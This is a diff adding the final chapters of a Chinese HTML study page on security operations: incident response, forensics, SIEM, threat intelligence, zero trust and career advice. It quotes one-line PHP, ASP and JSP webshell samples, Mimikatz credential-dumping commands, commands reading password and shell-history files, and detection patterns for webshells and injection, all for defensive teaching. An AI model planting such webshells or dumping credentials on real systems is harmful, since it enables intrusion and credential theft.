+        <h3>16.1 应急响应流程</h3>
+        <p>
+          应急响应（Incident
+          Response）是在安全事件发生后快速处置、减少损失的过程。参考 NIST SP
+          800-61 分为四个阶段：
+        </p>
+
+        <ol>
+          <li>
+            <strong>准备（Preparation）</strong
+            >：预案、工具、团队、联系方式、演练
+          </li>
+          <li>
+            <strong>检测与分析（Detection &amp; Analysis）</strong
+            >：告警确认、影响范围评估、IOC 分析
+          </li>
+          <li>
+            <strong
+              >遏制、根除与恢复（Containment, Eradication &amp;
+              Recovery）</strong
+            >：隔离、清除恶意代码、恢复系统、加固
+          </li>
+          <li>
+            <strong>事后活动（Post-Incident Activity）</strong
+            >：复盘报告、改进措施、更新规则
+          </li>
+        </ol>
+
+        <h3>16.2 Linux 应急响应</h3>
+        <pre><code># 1. 系统信息
+uname -a
+cat /etc/os-release
+uptime
+date
+
+# 2. 用户与登录
+w / who
+last -a | head -20
+lastb | head -20          # 失败登录
+cat /etc/passwd | grep -v nologin
+awk -F: '($3==0){print $1}' /etc/passwd  # UID=0 用户
+cat ~/.bash_history
+cat /root/.bash_history
+
+# 3. 进程与服务
+ps auxf
+ps aux --sort=-%cpu | head
+ls -la /proc/*/exe 2>/dev/null   # 进程对应程序
+systemctl list-units --state=running
+ls -la /etc/systemd/system/multi-user.target.wants/
+
+# 4. 网络
+ss -tulnp
+ss -antp | grep ESTAB
+netstat -antp
+arp -a
+
+# 5. 计划任务
+crontab -l
+ls -la /etc/cron*
+cat /etc/crontab
+systemctl list-timers
+
+# 6. 文件排查
+find / -mtime -1 -type f 2>/dev/null       # 最近 1 天修改的文件
+find / -perm -4000 2>/dev/null              # SUID
+find /tmp /var/tmp /dev/shm -type f 2>/dev/null  # 临时目录
+ls -la /etc/ld.so.preload 2>/dev/null       # 预加载后门
+
+# 7. 日志
+grep "Accepted" /var/log/auth.log | tail
+grep "Failed" /var/log/auth.log | tail
+grep "sshd" /var/log/auth.log | grep "Invalid user"</code></pre>
+
+        <h3>16.3 Windows 应急响应</h3>
+        <pre><code># 1. 系统信息
+systeminfo
+wmic qfe list brief                    # 已安装补丁
+
+# 2. 用户与登录
+net user
+net localgroup administrators
+query user                              # 登录会话
+wevtutil qe Security /q:"*[System[EventID=4624]]" /c:20 /f:text
+
+# 3. 进程与服务
+tasklist /svc
+wmic process get name,processid,commandline /format:list
+wmic service where state="running" get name,pathname,startname
+
+# 4. 网络
+netstat -ano | findstr ESTABLISHED
+netstat -ano | findstr LISTENING
+
+# 5. 启动项与计划任务
+wmic startup list full
+schtasks /query /fo LIST /v | findstr "TaskName"
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+# 6. 凭证检查
+# Mimikatz（需要 SYSTEM 权限）
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+
+# 7. 日志分析（事件 ID）
+# 4624 — 登录成功
+# 4625 — 登录失败
+# 4672 — 特权登录
+# 4720 — 用户创建
+# 4732 — 添加到组
+# 7045 — 服务安装</code></pre>
+
+        <h3>16.4 Web 入侵排查</h3>
+        <pre><code># 1. WebShell 查找
+find /var/www -name "*.php" -mtime -7
+find /var/www -type f -name "*.php" | xargs grep -l "eval\|assert\|system\|exec\|base64_decode"
+grep -r "base64_decode" /var/www/
+# 专用工具：D盾、河马 WebShell 扫描器、CloudWalker
+
+# 2. 访问日志分析
+# SQL 注入特征
+grep -i "union.*select" /var/log/nginx/access.log
+grep -i "or 1=1" /var/log/nginx/access.log
+# 扫描器特征
+grep -E "sqlmap|nikto|nmap|dirbuster" /var/log/nginx/access.log
+# 高频请求
+awk '{print $1}' access.log | sort | uniq -c | sort -rn | head 20
+# 异常响应码
+awk '$9==500' access.log | tail -20
+
+# 3. 常见 WebShell 类型
+# PHP: 一句话 &lt;?php @eval($_POST['cmd']); ?&gt;
+# ASP: &lt;%eval request("cmd")%&gt;
+# JSP: Runtime.getRuntime().exec(request.getParameter("cmd"));
+# 内存马：Filter/Servlet/Listener 型，无文件落地</code></pre>
+
+        <h3>16.5 数字取证</h3>
+        <p>
+          数字取证（Digital
+          Forensics）是科学地收集、保全、分析和呈现数字证据的过程。
+        </p>
+        <ul>
+          <li>
+            <strong>取证原则</strong>：保全原始证据、记录完整链条（Chain of
+            Custody）、最小化改动
+          </li>
+          <li>
+            <strong>内存取证</strong>：Volatility
+            分析内存镜像（进程、网络连接、注册表、密码）
+          </li>
+          <li>
+            <strong>磁盘取证</strong>：Autopsy/FTK Imager
+            制作磁盘镜像、恢复删除文件
+          </li>
+          <li>
+            <strong>网络取证</strong>：Wireshark 分析 pcap、BruteShark 提取凭证
+          </li>
+          <li>
+            <strong>移动取证</strong>：Cellebrite、Oxygen Forensic（需合法授权）
+          </li>
+        </ul>
+
+        <pre><code># Volatility 3 内存分析
+vol -f memory.raw windows.pslist
+vol -f memory.raw windows.pstree
+vol -f memory.raw windows.netscan
+vol -f memory.raw windows.cmdline
+vol -f memory.raw windows.hashdump
+vol -f memory.raw windows.malfind
+
+# FTK Imager — 制作磁盘镜像（只读挂载）
+# dd 命令（Linux）
+dd if=/dev/sda of=/evidence/disk.dd bs=4M conv=sync,noerror
+
+# 证据保全：计算哈希
+sha256sum /evidence/disk.dd > /evidence/disk.dd.sha256</code></pre>
+
+        <h3>16.6 勒索软件应急</h3>
+        <ol>
+          <li>
+            <strong>立即隔离</strong
+            >：断开受感染主机网络（不要关机，保留内存证据）
+          </li>
+          <li>
+            <strong>确定范围</strong
+            >：识别感染主机数量、加密文件类型、勒索信内容
+          </li>
+          <li>
+            <strong>识别家族</strong>：加密文件扩展名、勒索信样式，上传 ID
+            Ransomware 识别
+          </li>
+          <li>
+            <strong>阻断传播</strong>：禁用共享、关闭 SMBv1、隔离
+            VLAN、修改所有密码
+          </li>
+          <li>
+            <strong>清除恢复</strong>：重装系统 → 恢复备份（离线备份）→ 部署 EDR
+            → 补丁更新
+          </li>
+          <li>
+            <strong>报告</strong>：72 小时内向有关部门报告（《网络安全法》要求）
+          </li>
+        </ol>
+
+        <div class="warn">
+          <strong>不要支付赎金：</strong
+          >支付赎金不保证恢复数据，还会助长犯罪。优先从离线备份恢复，使用 No
+          More Ransom 项目的免费解密工具。
+        </div>
+      </section>
+
+      <!-- ==================== 第十七章 ==================== -->
+      <section class="section" id="ch17">
+        <h2><span class="num">17</span> SOC 与 SIEM 安全运营</h2>
+
+        <h3>17.1 SOC 概述</h3>
+        <p>
+          SOC（Security Operations
+          Center，安全运营中心）是集中监控、检测、分析和响应安全事件的团队和设施。现代
+          SOC 融合了人员、流程和技术。
+        </p>
+
+        <h3>17.2 SIEM 平台</h3>
+        <p>
+          SIEM（Security Information and Event
+          Management）集中收集和关联分析来自多源的日志数据，提供实时告警和合规报告。
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>平台</th>
+              <th>类型</th>
+              <th>特点</th>
+            </tr>
+            <tr>
+              <td>Splunk</td>
+              <td>商业</td>
+              <td>功能强大，搜索语言 SPL，企业级标杆</td>
+            </tr>
+            <tr>
+              <td>IBM QRadar</td>
+              <td>商业</td>
+              <td>规则引擎强，AQL 查询</td>
+            </tr>
+            <tr>
+              <td>Elastic Security (ELK)</td>
+              <td>开源/商业</td>
+              <td>Elasticsearch + Kibana，灵活可扩展</td>
+            </tr>
+            <tr>
+              <td>Wazuh</td>
+              <td>开源</td>
+              <td>基于 OSSEC + OpenSearch，HIDS + SIEM</td>
+            </tr>
+            <tr>
+              <td>Microsoft Sentinel</td>
+              <td>云原生</td>
+              <td>Azure 云 SIEM，SOAR 内置</td>
+            </tr>
+            <tr>
+              <td>Aliyun SLS</td>
+              <td>云原生</td>
+              <td>阿里云日志服务，国内企业常用</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>17.3 日志源与采集</h3>
+        <pre><code># 关键日志源
+# 网络设备：防火墙、IDS/IPS、VPN、代理服务器、DNS
+# 终端：Windows 事件日志、Linux syslog、EDR 告警
+# 应用：Web 服务器访问日志、应用日志、数据库审计
+# 身份：AD 域控、SSO、VPN 登录、IAM
+# 云平台：CloudTrail（AWS）、ActionTrail（阿里云）
+# 安全工具：漏洞扫描报告、WAF 日志、邮件网关
+
+# Syslog 协议
+# /etc/rsyslog.conf
+*.* @@siem.example.com:514    # TCP 转发
+*.* @siem.example.com:514     # UDP 转发
+
+# Windows 事件转发（WEF）
+# GPO 配置 → 事件查看器 → 订阅
+
+# Filebeat → Logstash → Elasticsearch
+filebeat.inputs:
+- type: log
+  paths:
+    - /var/log/nginx/access.log
+  fields:
+    log_type: nginx-access</code></pre>
+
+        <h3>17.4 检测规则与告警分析</h3>
+        <pre><code># Sigma 规则（通用检测规则格式）
+title: Suspicious PowerShell Encoded Command
+status: test
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - ' -enc '
+      - ' -EncodedCommand '
+  condition: selection
+level: high
+
+# Splunk SPL 查询示例
+# 检测多次登录失败
+index=security EventCode=4625
+| stats count by src_ip, Account_Name
+| where count > 5
+
+# 检测异常进程树（Office 派生 PowerShell）
+index=security EventCode=4688
+ParentImage="*\\WINWORD.EXE"
+Image="*\\powershell.exe"
+
+# 检测非工作时间登录
+index=security EventCode=4624
+| eval hour=strftime(_time,"%H")
+| where hour<7 OR hour>20</code></pre>
+
+        <h3>17.5 威胁情报</h3>
+        <p>
+          威胁情报（Threat
+          Intelligence）是关于现有或新兴威胁的基于证据的知识，包括
+          IOC（失陷指标）和 TTP（战术、技术与过程）。
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>情报类型</th>
+              <th>内容</th>
+              <th>来源</th>
+            </tr>
+            <tr>
+              <td>战略情报</td>
+              <td>威胁趋势、攻击者画像</td>
+              <td>报告、新闻、行业分享</td>
+            </tr>
+            <tr>
+              <td>战术情报</td>
+              <td>TTP、攻击工具、IOC</td>
+              <td>MISP、OTX、IBM X-Force</td>
+            </tr>
+            <tr>
+              <td>运营情报</td>
+              <td>具体告警上下文</td>
+              <td>SIEM 关联、沙箱报告</td>
+            </tr>
+            <tr>
+              <td>技术情报</td>
+              <td>IP、域名、Hash、URL</td>
+              <td>VirusTotal、AbuseIPDB、Spamhaus</td>
+            </tr>
+          </table>
+        </div>
+
+        <pre><code># STIX/TAXII — 威胁情报标准格式
+# MISP — 开源威胁情报平台
+# OpenCTI — 威胁情报管理平台
+
+# 常用免费情报源
+# AbuseIPDB: https://www.abuseipdb.com/
+# VirusTotal: https://www.virustotal.com/
+# URLhaus: https://urlhaus.abuse.ch/
+# AlienVault OTX: https://otx.alienvault.com/
+# MITRE ATT&CK: https://attack.mitre.org/</code></pre>
+
+        <h3>17.6 MITRE ATT&amp;CK 框架</h3>
+        <p>
+          ATT&amp;CK（Adversarial Tactics, Techniques, and Common
+          Knowledge）是攻击行为知识库，已成为行业标准语言。
+        </p>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>战术阶段</th>
+              <th>说明</th>
+              <th>典型技术</th>
+            </tr>
+            <tr>
+              <td>Reconnaissance</td>
+              <td>侦察</td>
+              <td>主动扫描、信息收集</td>
+            </tr>
+            <tr>
+              <td>Initial Access</td>
+              <td>初始访问</td>
+              <td>钓鱼邮件、利用公网应用</td>
+            </tr>
+            <tr>
+              <td>Execution</td>
+              <td>执行</td>
+              <td>PowerShell、命令行、脚本</td>
+            </tr>
+            <tr>
+              <td>Persistence</td>
+              <td>持久化</td>
+              <td>计划任务、注册表 Run、服务</td>
+            </tr>
+            <tr>
+              <td>Privilege Escalation</td>
+              <td>权限提升</td>
+              <td>漏洞利用、令牌假冒</td>
+            </tr>
+            <tr>
+              <td>Defense Evasion</td>
+              <td>防御绕过</td>
+              <td>禁用安全工具、混淆、进程注入</td>
+            </tr>
+            <tr>
+              <td>Credential Access</td>
+              <td>凭证获取</td>
+              <td>Mimikatz、键盘记录、暴力破解</td>
+            </tr>
+            <tr>
+              <td>Lateral Movement</td>
+              <td>横向移动</td>
+              <td>PsExec、WMI、Pass-the-Hash</td>
+            </tr>
+            <tr>
+              <td>Collection</td>
+              <td>收集</td>
+              <td>数据窃取、屏幕截图</td>
+            </tr>
+            <tr>
+              <td>Command &amp; Control</td>
+              <td>命令控制</td>
+              <td>C2 通道、DNS 隧道、代理</td>
+            </tr>
+            <tr>
+              <td>Exfiltration</td>
+              <td>数据外传</td>
+              <td>加密外传、云存储上传</td>
+            </tr>
+            <tr>
+              <td>Impact</td>
+              <td>影响</td>
+              <td>勒索、数据销毁、服务中断</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>17.7 SOAR 与自动化响应</h3>
+        <p>
+          SOAR（Security Orchestration, Automation and
+          Response）通过剧本（Playbook）自动化处理常见安全事件，减少人工重复劳动。
+        </p>
+        <pre><code># 典型自动化 Playbook
+# 触发：SIEM 告警 — 检测到恶意 IP 连接
+# 1. 自动查询威胁情报（VirusTotal/AbuseIPDB）
+# 2. 确认恶意后，自动在防火墙封禁该 IP
+# 3. 隔离受影响终端（EDR API）
+# 4. 创建工单（Jira/ServiceNow）
+# 5. 发送通知到安全团队（钉钉/企业微信/Slack）
+# 6. 记录处置时间线和结果
+
+# 开源 SOAR：Shuffle、Cortex、n8n
+# 商业 SOAR：Palo Alto XSOAR、Splunk SOAR、Microsoft Sentinel</code></pre>
+      </section>
+
+      <!-- ==================== 第十八章 ==================== -->
+      <section class="section" id="ch18">
+        <h2><span class="num">18</span> 安全架构设计与职业规划</h2>
+
+        <h3>18.1 零信任架构</h3>
+        <p>
+          零信任（Zero Trust）的核心原则：<strong
+            >从不信任，始终验证（Never Trust, Always Verify）</strong
+          >。不依赖网络边界，每次访问都需要认证和授权。
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>传统边界安全</th>
+              <th>零信任安全</th>
+            </tr>
+            <tr>
+              <td>内网即可信</td>
+              <td>内外网均不可信</td>
+            </tr>
+            <tr>
+              <td>一次认证，全网通行</td>
+              <td>每次访问都验证</td>
+            </tr>
+            <tr>
+              <td>基于网络位置授权</td>
+              <td>基于身份和上下文授权</td>
+            </tr>
+            <tr>
+              <td>粗粒度访问控制</td>
+              <td>最小权限 + 微隔离</td>
+            </tr>
+            <tr>
+              <td>静态策略</td>
+              <td>动态风险评估</td>
+            </tr>
+          </table>
+        </div>
+
+        <h4>零信任关键组件</h4>
+        <ul>
+          <li>
+            <strong>身份中心</strong>：统一身份（SSO + MFA），人的身份是新边界
+          </li>
+          <li>
+            <strong>设备信任</strong>：设备合规状态检查（补丁、加密、EDR）
+          </li>
+          <li><strong>持续验证</strong>：每次请求认证，非一次性登录</li>
+          <li>
+            <strong>微隔离</strong
+            >：工作负载间细粒度访问控制（不是网络可达就能访问）
+          </li>
+          <li>
+            <strong>动态策略</strong
+            >：结合用户角色、设备状态、位置、行为风险动态决策
+          </li>
+        </ul>
+
+        <h3>18.2 纵深防御</h3>
+        <p>
+          纵深防御（Defense in
+          Depth）使用多层安全控制，任何单层失效不会导致整体失守。
+        </p>
+        <pre><code># 安全控制层次
+# ┌─────────────────────────────┐
+# │ 物理安全：门禁、监控、设备锁  │
+# ├─────────────────────────────┤
+# │ 边界安全：防火墙、DDoS 防护   │
+# ├─────────────────────────────┤
+# │ 网络安全：IDS/IPS、NAC、隔离  │
+# ├─────────────────────────────┤
+# │ 主机安全：EDR、加固、补丁     │
+# ├─────────────────────────────┤
+# │ 应用安全：WAF、代码审计、SAST │
+# ├─────────────────────────────┤
+# │ 数据安全：加密、DLP、备份     │
+# ├─────────────────────────────┤
+# │ 身份安全：MFA、IAM、零信任    │
+# ├─────────────────────────────┤
+# │ 安全运营：SOC、SIEM、IR       │
+# ├─────────────────────────────┤
+# │ 安全意识：培训、钓鱼演练      │
+# └─────────────────────────────┘</code></pre>
+
+        <h3>18.3 安全开发生命周期（SDL）</h3>
+        <ol>
+          <li><strong>培训</strong>：开发团队安全编码培训</li>
+          <li><strong>需求</strong>：安全需求分析、威胁建模（STRIDE）</li>
+          <li><strong>设计</strong>：安全架构评审、攻击面分析</li>
+          <li><strong>开发</strong>：安全编码规范、禁用危险函数</li>
+          <li><strong>测试</strong>：SAST、DAST、依赖扫描、渗透测试</li>
+          <li><strong>发布</strong>：安全审批、应急响应预案</li>
+          <li><strong>响应</strong>：漏洞管理、补丁发布、根因分析</li>
+        </ol>
+
+        <pre><code># STRIDE 威胁建模
+# S — Spoofing（仿冒）         → 认证
+# T — Tampering（篡改）         → 完整性
+# R — Repudiation（抵赖）       → 不可否认
+# I — Information Disclosure（信息泄露）→ 机密性
+# D — Denial of Service（拒绝服务）→ 可用性
+# E — Elevation of Privilege（提权）→ 授权
+
+# 安全编码原则
+# 1. 最小权限原则
+# 2. 默认安全（Secure by Default）
+# 3. 纵深防御
+# 4. 失败安全（Fail Securely）
+# 5. 不信任任何输入
+# 6. 最小化攻击面
+# 7. 不使用已废弃的不安全函数（strcpy、sprintf、gets）</code></pre>
+
+        <h3>18.4 风险管理框架</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>风险等级</th>
+              <th>矩阵（可能性 × 影响）</th>
+              <th>处置策略</th>
+            </tr>
+            <tr>
+              <td>高风险</td>
+              <td>高/高、中/高、高/中</td>
+              <td>立即修复，管理层关注</td>
+            </tr>
+            <tr>
+              <td>中风险</td>
+              <td>高/低、中/中、低/高</td>
+              <td>计划修复，定期跟踪</td>
+            </tr>
+            <tr>
+              <td>低风险</td>
+              <td>中/低、低/中、低/低</td>
+              <td>接受或择机修复</td>
+            </tr>
+          </table>
+        </div>
+
+        <ul>
+          <li><strong>风险规避</strong>：停止高风险业务</li>
+          <li><strong>风险降低</strong>：部署安全控制减少可能性或影响</li>
+          <li><strong>风险转移</strong>：购买网络安全保险、外包给安全服务商</li>
+          <li><strong>风险接受</strong>：评估后接受残余风险（需签字确认）</li>
+        </ul>
+
+        <h3>18.5 职业发展路径</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>级别</th>
+              <th>工作年限</th>
+              <th>能力要求</th>
+              <th>典型岗位</th>
+            </tr>
+            <tr>
+              <td>初级</td>
+              <td>0-2 年</td>
+              <td>安全基础、工具使用、日志分析</td>
+              <td>安全运维、渗透测试工程师</td>
+            </tr>
+            <tr>
+              <td>中级</td>
+              <td>3-5 年</td>
+              <td>独立完成渗透测试/应急响应、代码审计</td>
+              <td>高级渗透测试、安全研究员</td>
+            </tr>
+            <tr>
+              <td>高级</td>
+              <td>5-8 年</td>
+              <td>架构设计、红队评估、专项研究</td>
+              <td>安全专家、红队队长</td>
+            </tr>
+            <tr>
+              <td>专家/管理</td>
+              <td>8 年+</td>
+              <td>战略规划、团队建设、风险决策</td>
+              <td>安全架构师、CISO</td>
+            </tr>
+          </table>
+        </div>
+
+        <h4>核心能力矩阵</h4>
+        <ul>
+          <li>
+            <strong>技术深度</strong>：选定一个方向深入（Web
+            安全/内网/逆向/云安全/安全开发）
+          </li>
+          <li>
+            <strong>技术广度</strong>：理解网络、系统、开发、运维、业务全链路
+          </li>
+          <li>
+            <strong>编程能力</strong>：Python/Go
+            自动化脚本开发，能读懂代码（C/Java/Go/JS）
+          </li>
+          <li>
+            <strong>英文能力</strong
+            >：安全社区和最新资料以英文为主，能阅读漏洞报告和 Writeup
+          </li>
+          <li>
+            <strong>沟通能力</strong
+            >：能将技术风险用业务语言表达，写好报告和方案
+          </li>
+          <li>
+            <strong>持续学习</strong>：安全领域变化极快，关注
+            CVE、CTF、安全会议（Black Hat/DEF CON/CANSEC）
+          </li>
+        </ul>
+
+        <h3>18.6 学习资源推荐</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类别</th>
+              <th>推荐资源</th>
+            </tr>
+            <tr>
+              <td>在线靶场</td>
+              <td>
+                Hack The Box、TryHackMe、VulnHub、PortSwigger Web Security
+                Academy
+              </td>
+            </tr>
+            <tr>
+              <td>CTF 平台</td>
+              <td>CTFtime、PicoCTF、攻防世界、BUUCTF</td>
+            </tr>
+            <tr>
+              <td>漏洞练习</td>
+              <td>DVWA、WebGoat、Juice Shop、Vulhub（Docker 漏洞环境）</td>
+            </tr>
+            <tr>
+              <td>安全社区</td>
+              <td>FreeBuf、先知社区、看雪、安全客、Paper.Seebug</td>
+            </tr>
+            <tr>
+              <td>英文资源</td>
+              <td>
+                PortSwigger Daily Swig、Krebs on Security、The Hacker
+                News、Bleeping Computer
+              </td>
+            </tr>
+            <tr>
+              <td>经典书籍</td>
+              <td>
+                《Web 安全深度剖析》《白帽子讲 Web 安全》《Metasploit
+                渗透测试指南》《加密与解密》
+              </td>
+            </tr>
+            <tr>
+              <td>官方文档</td>
+              <td>OWASP、MITRE ATT&amp;CK、NIST、CIS Benchmarks</td>
+            </tr>
+            <tr>
+              <td>安全会议</td>
+              <td>Black Hat、DEF CON、CanSecWest、HITB、KCon、CSS</td>
+            </tr>
+          </table>
+        </div>
+
+        <div class="tip">
+          <strong>成长建议：</strong
+          >建立个人知识库（类似你正在阅读的这份笔记），坚持 CTF
+          和靶场练习，定期写 Writeup 总结。关注真实漏洞分析（Project
+          Zero、PortSwigger Research），尝试复现
+          CVE。安全是一个"越老越吃香"的领域——经验和思维方式比工具更重要。
+        </div>
+      </section>
+    </main>
+
+    <script>
+      // 代码复制按钮
+      document.querySelectorAll('pre').forEach(function (pre) {
+        var btn = document.createElement('button')
+        btn.className = 'copy-btn'
+        btn.textContent = '复制'
+        btn.addEventListener('click', function () {
+          var code = pre.querySelector('code')
+          var text = code ? code.textContent : pre.textContent
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = '已复制'
+            setTimeout(function () {
+              btn.textContent = '复制'
+            }, 1500)
+          })
+        })
+        pre.appendChild(btn)
+      })
+
+      // 侧边栏滚动高亮
+      var sections = document.querySelectorAll('.section')
+      var tocLinks = document.querySelectorAll('.toc a')
+      var observer = new IntersectionObserver(
+        function (entries) {
+          entries.forEach(function (entry) {
+            if (entry.isIntersecting) {
+              var id = entry.target.getAttribute('id')
+              tocLinks.forEach(function (link) {
+                link.classList.toggle(
+                  'active',
+                  link.getAttribute('href') === '#' + id,
+                )
+              })
+            }
+          })
+        },
+        { rootMargin: '-20% 0px -75% 0px' },
+      )
+      sections.forEach(function (s) {
+        observer.observe(s)
+      })
+
+      // 侧边栏点击平滑滚动 + 移动端关闭
+      tocLinks.forEach(function (link) {
+        link.addEventListener('click', function (e) {
+          if (!link.getAttribute('href').startsWith('#')) return
+          e.preventDefault()
+          var targetId = link.getAttribute('href').slice(1)
+          var target = document.getElementById(targetId)
+          if (target) {
+            target.scrollIntoView({ behavior: 'smooth', block: 'start' })
+          }
+          document.querySelector('.sidebar').classList.remove('open')
+        })
+      })
+
+      document.addEventListener('click', function (e) {
+        var sidebar = document.querySelector('.sidebar')
+        var menuToggle = document.querySelector('.menu-toggle')
+        if (
+          sidebar.classList.contains('open') &&
+          !sidebar.contains(e.target) &&
+          !menuToggle.contains(e.target)
+        ) {
+          sidebar.classList.remove('open')
+        }
+      })
+    </script>
+  </body>
+</html>
